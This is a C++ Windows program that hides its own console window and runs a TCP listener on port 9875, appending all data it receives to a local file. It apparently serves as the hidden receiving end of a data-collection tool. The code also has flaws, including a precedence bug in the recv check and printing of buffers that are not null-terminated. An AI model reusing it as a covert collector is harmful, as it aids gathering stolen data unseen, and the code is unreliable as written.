#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <fstream>
#include <iostream>
#include <pthread.h>

#pragma comment(lib, "Ws2_32.lib")

void Stealth() //HIDES CONSOLE
{
    HWND Stealth;
    AllocConsole();
    Stealth = GetConsoleWindow();
    ShowWindow(Stealth,0);
}

int Socket()
{
    
    while(1)
    {
        WSADATA wsaData;
        SOCKET serverSocket, newConnection;
        SOCKADDR_IN ServerAddr, SenderInfo;
        unsigned int Port = 9875;
        char recvbuff[1024];
        int ByteReceived, i, nlen, SelectTiming;
        WSAStartup(MAKEWORD(2,2), &wsaData);

        //printf("Server: Winsock DLL status is %s.\n", wsaData.szSystemStatus);

        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if(serverSocket == INVALID_SOCKET)
        {
            printf("Server: socket() failed! Error code: %ld\n", WSAGetLastError());
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            printf("Server: socket() is OK!\n");
        }
        
        ServerAddr.sin_family = AF_INET;
        ServerAddr.sin_port = htons(Port);
        ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);

        if(bind(serverSocket,(sockaddr *)&ServerAddr,sizeof(ServerAddr)) == SOCKET_ERROR)
        {
            printf("Server: bind() failed! Error code: %ld.\n", WSAGetLastError());
            closesocket(serverSocket);
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            printf("Server: bind() is OK!\n");
        }
        
        if(listen(serverSocket, 5) == SOCKET_ERROR)
        {
            printf("Server: listen(): Error listening on socket %ld.\n", WSAGetLastError());
            closesocket(serverSocket);
            WSACleanup();
            Sleep(100);
            continue;
        }
        else
        {
            printf("Server: listening for incomming connections...\n");
        }

        while(1)
        {
            newConnection = SOCKET_ERROR;
            while(newConnection == SOCKET_ERROR)
            {
                newConnection = accept(serverSocket, NULL, NULL);
                printf("\nServer: accept() is OK...\n");
                printf("Server: New client got connected, ready to receive and send data...\n");
                std::ofstream logFileS;
                logFileS.open("received.txt", std::ios_base::app | std::ios::binary);
                while(1)
                {
                    if(ByteReceived = recv(newConnection, recvbuff, sizeof(recvbuff), 0) > 0)
                    {
                        printf("Received: %s", recvbuff);
                        logFileS << recvbuff << std::endl;
                        memset(recvbuff, 0, sizeof recvbuff);
                        Sleep(10);
                    }
                    else if(ByteReceived == SOCKET_ERROR)
                    {
                        printf("Server: recv() failed with error code: %d\n", WSAGetLastError());
                        break;
                    }
                    else
                    {
                        printf("NO DATA");
                        break;
                    }
                }

                logFileS.close();
                printf("File closed and received!");
                
                if( shutdown(newConnection, SD_SEND) != 0)
                {
                    printf("\nServer: Well, there is something wrong with the shutdown(). The error code: %ld\n", WSAGetLastError());
                    closesocket(serverSocket);
                    WSACleanup();
                    break;
                }
                else
                {
                    printf("\nServer: shutdown() looks OK...\n");
                    closesocket(serverSocket);
                    WSACleanup();
                    break;
                }
                break;
            }
        break;
        }
    }
}

int main(int argc, char const *argv[])
{
    Stealth();
    return Socket();
}